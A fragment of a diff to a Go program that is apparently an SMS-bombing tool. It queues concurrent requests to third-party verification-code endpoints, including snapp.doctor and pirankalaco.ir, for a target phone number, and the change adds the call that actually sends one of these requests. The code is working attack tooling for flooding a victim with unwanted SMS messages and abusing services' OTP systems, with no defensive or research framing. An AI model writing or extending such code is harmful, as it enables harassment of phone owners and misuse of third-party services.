@@ -368,7 +368,8 @@ func main() {
 		// https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/09123456456/sms?cCode=%2B98 (GET)
 		wg.Add(1)
 		tasks <- func() {
-			urlWithPhone := fmt.Sprintf("https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/%s/sms?cCode=+98", phone)
+			urlWithPhone := fmt.Sprintf("https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/%s/sms?cCode=+98", phone) 
+			sendGETRequest(ctx, urlWithPhone, &wg, ch)
 		}
 		// https://pirankalaco.ir/SendPhone.php (Form Data)
 		wg.Add(1)
